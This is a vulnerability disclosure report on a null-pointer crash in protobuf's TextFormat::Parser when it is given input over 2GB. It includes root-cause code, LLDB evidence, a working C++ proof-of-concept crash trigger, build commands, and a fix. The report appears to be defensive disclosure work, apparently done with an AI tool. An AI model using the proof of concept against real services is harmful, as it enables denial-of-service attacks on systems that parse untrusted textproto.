# Bug: TextFormat::Parser Null Pointer Dereference (Oversize Input)

**ID:** protobuf-textformat-oversize  
**Severity:** HIGH (DoS)  
**Status:** VERIFIED with LLDB  
**Target:** Google Protocol Buffers (protobuf)  
**Affected:** `TextFormat::Parser` in all C++ implementations  

---

## Summary

`TextFormat::Parser::ParseFromString()` crashes with a null pointer dereference when given input larger than `INT_MAX` bytes (~2GB). The function `CheckParseInputSize()` calls `error_collector->RecordError()` without checking if `error_collector` is null (which is the default).

---

## Root Cause

```cpp
// text_format.cc:1945-1955
template <typename T>
bool CheckParseInputSize(T& input, io::ErrorCollector* error_collector) {
  if (input.size() > INT_MAX) {
    error_collector->RecordError(  // BUG: No null check!
        -1, 0,
        absl::StrCat("Input size too large: ", ...));
    return false;
  }
  return true;
}
```

The `Parser` class defaults `error_collector_` to `nullptr`:
```cpp
Parser::Parser() : error_collector_(nullptr), ...
```

---

## LLDB Evidence

### Crash Info
```
stop reason = EXC_BAD_ACCESS (code=1, address=0x0)
frame #0: CheckParseInputSize<std::string_view>() + 224
```

### Register State (Proof of NULL)
```
(lldb) register read x19
     x19 = 0x0000000000000000   ; <-- NULL pointer!
```

### Variable State
```
(lldb) frame variable
(google::protobuf::TextFormat::Parser) parser = {
  error_collector_ = nullptr    ; <-- ROOT CAUSE
  recursion_limit_ = 2147483647
}
(const size_t) kSize = 2147483648  ; INT_MAX + 1
```

### Backtrace
```
frame #0: CheckParseInputSize()     ; CRASH HERE
frame #1: ParseFromString()
frame #2: main() at oversize_textformat.cc:39
```

---

## Evidence Summary

| Metric | Value |
|--------|-------|
| **Crash Signal** | SIGSEGV (11) |
| **Exit Code** | 139 |
| **Crash Address** | 0x0 (NULL) |
| **Trigger Size** | > 2,147,483,647 bytes |
| **Affected Register** | x19 = 0x0 (error_collector) |
| **Vulnerable Function** | `CheckParseInputSize()` |
| **Source File** | text_format.cc:1947 |

---

## Reproduction

### PoC Code (oversize_textformat.cc)
```cpp
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <climits>
#include <string_view>

#include "google/protobuf/any.pb.h"
#include "google/protobuf/text_format.h"

int main() {
  constexpr size_t kSize = static_cast<size_t>(INT_MAX) + 1;
  
  // Create sparse file of INT_MAX+1 bytes
  char path[] = "/tmp/protobuf-oversize.XXXXXX";
  int fd = mkstemp(path);
  unlink(path);
  ftruncate(fd, static_cast<off_t>(kSize));
  
  void* mapped = mmap(nullptr, kSize, PROT_READ, MAP_PRIVATE, fd, 0);
  
  google::protobuf::Any message;
  google::protobuf::TextFormat::Parser parser;
  
  // CRASH: null dereference in CheckParseInputSize()
  bool ok = parser.ParseFromString(
      std::string_view(static_cast<const char*>(mapped), kSize), &message);
  
  munmap(mapped, kSize);
  close(fd);
  return ok ? 0 : 1;
}
```

### Compile & Run
```bash
clang++ -g -O0 -std=c++17 \
  $(pkg-config --cflags protobuf) \
  oversize_textformat.cc \
  $(pkg-config --libs protobuf) \
  -o oversize_textformat

./oversize_textformat
# Segmentation fault: 11
# Exit code: 139
```

### Debug with LLDB
```bash
lldb ./oversize_textformat
(lldb) run
# EXC_BAD_ACCESS (code=1, address=0x0)
(lldb) bt
(lldb) register read x19
# x19 = 0x0000000000000000
```

---

## Impact

- **DoS Vector:** Any service that parses textproto from untrusted sources can be crashed
- **Attack:** Send input > 2GB to trigger crash
- **Affected APIs:** `ParseFromString()`, `MergeFromString()`, `Parse()`, `ParseFromCord()`

---

## Recommended Fix

```cpp
template <typename T>
bool CheckParseInputSize(T& input, io::ErrorCollector* error_collector) {
  if (input.size() > INT_MAX) {
    if (error_collector != nullptr) {  // ADD THIS CHECK
      error_collector->RecordError(-1, 0, 
          absl::StrCat("Input size too large: ", ...));
    }
    return false;
  }
  return true;
}
```

---

## Files

```
poc/
  oversize_textformat.cc     # PoC source code
  oversize_textformat        # Compiled binary

debugging/
  LLDB_DEBUG_REPORT.md       # Full LLDB session with evidence
```

---

## Timeline

- 2026-04-13: Vulnerability discovered by VulnHunter (Codex/GPT-5.4)
- 2026-04-13: PoC developed and crash confirmed
- 2026-04-13: LLDB debugging completed (NULL pointer at x19=0x0)
- Pending: Google VRP submission
